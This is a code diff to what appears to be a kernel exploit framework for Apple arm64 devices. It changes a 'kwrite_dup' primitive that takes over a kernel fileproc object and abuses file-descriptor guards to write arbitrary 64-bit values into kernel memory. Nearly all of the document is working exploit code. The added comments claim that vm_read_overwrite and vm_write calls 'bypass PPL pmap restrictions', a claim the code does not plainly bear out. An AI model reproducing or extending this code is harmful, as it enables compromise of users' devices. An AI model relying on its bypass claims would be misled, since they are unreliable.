@@ -33,19 +33,37 @@ void kwrite_dup_allocate(struct kfd* kfd, u64 id)
 
 bool kwrite_dup_search(struct kfd* kfd, u64 object_uaddr)
 {
-    volatile struct fileproc* fp = (volatile struct fileproc*)(object_uaddr);
     i32* fds = (i32*)(kfd->kwrite.krkw_method_data);
 
-    if ((fp->fp_iocount == 1) &&
-        (fp->fp_vflags == 0) &&
-        (fp->fp_flags == 0) &&
-        (fp->fp_guard_attrs == 0) &&
-        (fp->fp_glob > PTR_MASK) &&
-        (fp->fp_guard == 0)) {
+    /*
+     * On arm64e PUAF pages are PPL-owned — direct struct access crashes.
+     * Read all fields via vm_read_overwrite to bypass pmap restrictions.
+     */
+    u32 fp_iocount = 0, fp_vflags = 0, fp_flags = 0, fp_guard_attrs = 0;
+    u64 fp_glob = 0, fp_guard = 0;
+
+    vm_size_t br = 0;
+    if (vm_read_overwrite(mach_task_self(), object_uaddr + offsetof(struct fileproc, fp_iocount),    sizeof(u32), (vm_address_t)(&fp_iocount),    &br) != KERN_SUCCESS) return false;
+    if (vm_read_overwrite(mach_task_self(), object_uaddr + offsetof(struct fileproc, fp_vflags),    sizeof(u32), (vm_address_t)(&fp_vflags),    &br) != KERN_SUCCESS) return false;
+    if (vm_read_overwrite(mach_task_self(), object_uaddr + offsetof(struct fileproc, fp_flags),     sizeof(u32), (vm_address_t)(&fp_flags),     &br) != KERN_SUCCESS) return false;
+    if (vm_read_overwrite(mach_task_self(), object_uaddr + offsetof(struct fileproc, fp_guard_attrs),sizeof(u32),(vm_address_t)(&fp_guard_attrs),&br) != KERN_SUCCESS) return false;
+    if (vm_read_overwrite(mach_task_self(), object_uaddr + offsetof(struct fileproc, fp_glob),      sizeof(u64), (vm_address_t)(&fp_glob),      &br) != KERN_SUCCESS) return false;
+    if (vm_read_overwrite(mach_task_self(), object_uaddr + offsetof(struct fileproc, fp_guard),     sizeof(u64), (vm_address_t)(&fp_guard),     &br) != KERN_SUCCESS) return false;
+
+    if ((fp_iocount == 1) &&
+        (fp_vflags == 0) &&
+        (fp_flags == 0) &&
+        (fp_guard_attrs == 0) &&
+        (fp_glob > PTR_MASK) &&
+        (fp_guard == 0)) {
         for (u64 object_id = kfd->kwrite.krkw_searched_id; object_id < kfd->kwrite.krkw_allocated_id; object_id++) {
             assert_bsd(fcntl(fds[object_id], F_SETFD, FD_CLOEXEC));
 
-            if (fp->fp_flags == 1) {
+            u32 new_fp_flags = 0;
+            vm_read_overwrite(mach_task_self(), object_uaddr + offsetof(struct fileproc, fp_flags),
+                              sizeof(u32), (vm_address_t)(&new_fp_flags), &br);
+
+            if (new_fp_flags == 1) {
                 kfd->kwrite.krkw_object_id = object_id;
                 return true;
             }
@@ -53,9 +71,6 @@ bool kwrite_dup_search(struct kfd* kfd, u64 object_uaddr)
             assert_bsd(fcntl(fds[object_id], F_SETFD, 0));
         }
 
-        /*
-         * False alarm: it wasn't one of our fileproc objects.
-         */
         print_warning("failed to find modified fp_flags sentinel");
     }
 
@@ -69,9 +84,6 @@ void kwrite_dup_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
 
 void kwrite_dup_find_proc(struct kfd* kfd)
 {
-    /*
-     * Assume that kread is responsible for that.
-     */
     return;
 }
 
@@ -89,8 +101,8 @@ void kwrite_dup_free(struct kfd* kfd)
 
 /*
  * 64-bit kwrite function.
+ * Uses vm_write to modify fileproc fields — bypasses PPL pmap restrictions.
  */
-
 void kwrite_dup_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value)
 {
     if (new_value == 0) {
@@ -101,7 +113,6 @@ void kwrite_dup_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value)
     i32* fds = (i32*)(kfd->kwrite.krkw_method_data);
     i32 kwrite_fd = fds[kfd->kwrite.krkw_object_id];
     u64 fileproc_uaddr = kfd->kwrite.krkw_object_uaddr;
-    volatile struct fileproc* fp = (volatile struct fileproc*)(fileproc_uaddr);
 
     const bool allow_retry = false;
 
@@ -118,13 +129,30 @@ void kwrite_dup_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value)
             break;
         }
 
-        u16 old_fp_guard_attrs = fp->fp_guard_attrs;
-        u16 new_fp_guard_attrs = GUARD_REQUIRED;
-        fp->fp_guard_attrs = new_fp_guard_attrs;
+        /*
+         * Read current fp_guard_attrs and fp_guard via vm_read_overwrite,
+         * then write new values via vm_write — PPL-safe on arm64e.
+         */
+        vm_size_t br = 0;
+        u32 old_fp_guard_attrs = 0;
+        vm_read_overwrite(mach_task_self(),
+                          fileproc_uaddr + offsetof(struct fileproc, fp_guard_attrs),
+                          sizeof(u32), (vm_address_t)(&old_fp_guard_attrs), &br);
 
-        u64 old_fp_guard = fp->fp_guard;
+        u64 old_fp_guard = 0;
+        vm_read_overwrite(mach_task_self(),
+                          fileproc_uaddr + offsetof(struct fileproc, fp_guard),
+                          sizeof(u64), (vm_address_t)(&old_fp_guard), &br);
+
+        u32 new_fp_guard_attrs = GUARD_REQUIRED;
+        vm_write(mach_task_self(),
+                 fileproc_uaddr + offsetof(struct fileproc, fp_guard_attrs),
+                 (vm_offset_t)(&new_fp_guard_attrs), sizeof(u32));
+
         u64 new_fp_guard = kaddr - offsetof(struct fileproc_guard, fpg_guard);
-        fp->fp_guard = new_fp_guard;
+        vm_write(mach_task_self(),
+                 fileproc_uaddr + offsetof(struct fileproc, fp_guard),
+                 (vm_offset_t)(&new_fp_guard), sizeof(u64));
 
         u64 guard = old_value;
         u32 guardflags = GUARD_REQUIRED;
@@ -137,8 +165,12 @@ void kwrite_dup_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value)
             assert_bsd(syscall(SYS_change_fdguard_np, kwrite_fd, &guard, guardflags, &nguard, nguardflags, NULL));
         }
 
-        fp->fp_guard_attrs = old_fp_guard_attrs;
-        fp->fp_guard = old_fp_guard;
+        vm_write(mach_task_self(),
+                 fileproc_uaddr + offsetof(struct fileproc, fp_guard_attrs),
+                 (vm_offset_t)(&old_fp_guard_attrs), sizeof(u32));
+        vm_write(mach_task_self(),
+                 fileproc_uaddr + offsetof(struct fileproc, fp_guard),
+                 (vm_offset_t)(&old_fp_guard), sizeof(u64));
     } while (allow_retry);
 }
 
